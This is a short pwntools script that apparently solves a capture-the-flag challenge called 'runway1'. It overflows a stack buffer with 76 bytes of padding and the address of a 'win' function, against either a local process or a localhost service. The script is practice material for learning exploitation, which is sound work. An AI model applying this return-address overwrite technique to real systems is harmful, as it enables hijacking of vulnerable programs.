#!/usr/bin/python3

from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-m", "--mode", required=True, choices=["d", "debug", "r", "remote"])
args = parser.parse_args()

context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"

if args.mode in ["d", "debug"]:
    p = process('./runway1')
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('localhost', 1338)
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

chall = ELF('./runway1', checksec=True)

pd = b'A' * 76
pd += p32(chall.sym['win'])
print(f"win() address: {hex(chall.sym['win'])}")
p.sendline(pd)
p.interactive()
